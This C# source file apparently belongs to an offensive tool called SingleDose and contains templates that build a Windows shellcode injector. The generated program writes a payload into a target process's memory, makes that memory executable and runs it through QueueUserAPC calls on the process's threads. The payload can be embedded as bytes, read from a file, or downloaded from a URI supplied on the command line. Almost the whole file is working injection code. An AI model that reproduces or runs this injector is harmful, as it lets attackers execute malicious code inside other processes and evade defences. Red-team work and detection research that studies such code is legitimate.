namespace SingleDose
{
    class Suspend_QueueUserAPC
    {
        public static string STATICMODE = @"
        Process proc = Process.GetProcessById( {{PROCESSID}} );
		System.Collections.Generic.List<byte> bufList = new System.Collections.Generic.List<byte> { {{SHELLCODE}} };
		byte[] payload = bufList.ToArray();
        ";

        public static string DYNAMICMODE = @"
        if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase)) {
            Console.WriteLine(""-pid: Process ID of target process \n-bin: Path to shellcode"");
            Environment.Exit(0);
        }
        ArgValues parsedArgs = ArgParse(args);
        Process proc = parsedArgs.Pid; 
        byte[] payload = System.IO.File.ReadAllBytes(parsedArgs.binPath);
        ";

        public static string DOWNLOADMODE = @"
        if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-uri"", StringComparer.OrdinalIgnoreCase)) {
            Console.WriteLine(""-PID: Absolute filepath used to spawn process \n-URI: URI to download"");
            Environment.Exit(0);
        }
        ArgValues parsedArgs = ArgParse(args);
        Process proc = parsedArgs.Pid;
        System.Net.WebClient wc = new System.Net.WebClient();
        byte[] payload;
        payload = wc.DownloadData(parsedArgs.DownloadURI);
            
        if (payload.Length == 0)
        {
            Console.WriteLine(""[!] Error downloading"");
        }
        ";

        public static string DYNAMICARGPARSE = @"
        public class ArgValues
        {
            public Process Pid;
            public string binPath;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-PID"") && arguments[i + 1] != null)
                    {
                        try 
                        {
                            collection.Pid = Process.GetProcessById(Int32.Parse(arguments[i+1]));
                        }
                        catch
                        {
                            Console.WriteLine(""[!] PID Error"");
                        }
                    }

                    if (arguments[i].ToUpper().StartsWith(""-BIN"") && arguments[i + 1] != null)
                    {
                        if (System.IO.File.Exists(arguments[i + 1]))
                        {
                            collection.binPath = arguments[i + 1];
                        }
                        else if (!System.IO.File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid bin path supplied."");
                            Environment.Exit(1);
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
            }

            return collection;
        }";

        public static string DOWNLOADARGPARSE = @"
        public class ArgValues
        {
            public Process Pid;
            public string DownloadURI;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-PID"") && arguments[i + 1] != null)
                    {
                        try 
                        {
                            collection.Pid = Process.GetProcessById(Int32.Parse(arguments[i+1]));
                        }
                        catch
                        {
                            Console.WriteLine(""[!] PID Error"");
                        }
                    }

                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        collection.DownloadURI = arguments[i + 1];
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
            }
            return collection;
        }";

        public static string BODY = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace {{NAMESPACE}}
{
    public class Program
    {
	    [DllImport(""kernel32.dll"", SetLastError = true)]
	    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

	    [DllImport(""kernel32.dll"")]
	    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

	    [DllImport(""kernel32.dll"")]
	    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

	    [DllImport(""kernel32.dll"", SetLastError = true)]
	    public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);

	    [DllImport(""kernel32.dll"")]
	    public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

	    [Flags]
	    public enum ThreadAccess : int
	    {
		    SUSPEND_RESUME = (0x0002),
		    GET_CONTEXT = (0x0008),
		    SET_CONTEXT = (0x0010)
	    }
	    public static void Main(string[] args)
	    {
		    {{TRIGGER}}
		    {{MODE}}
		    IntPtr lpResult = VirtualAllocEx(proc.Handle,IntPtr.Zero,payload.Length, 0x1000, 0x04); //MEM_COMMIT = 0x1000, RW= 0x04
		    IntPtr bWritten;
		    if (WriteProcessMemory(proc.Handle, lpResult, payload, payload.Length, out bWritten))
            {
			    uint oldPerms;
			    VirtualProtectEx(proc.Handle, lpResult, payload.Length, 0x20, out oldPerms);

			    ProcessThreadCollection thread = proc.Threads;
			    for (int i = 0; i < 5; i++)
				{
					try
					{
						IntPtr hThread = OpenThread(ThreadAccess.SUSPEND_RESUME | ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, thread[i].Id);
						IntPtr ptr = QueueUserAPC(lpResult, hThread, IntPtr.Zero);
					}
                    catch
                    {
						continue;
                    }
				}
		    }
	    }
        {{ARGS}}
    }
}";
    }
}
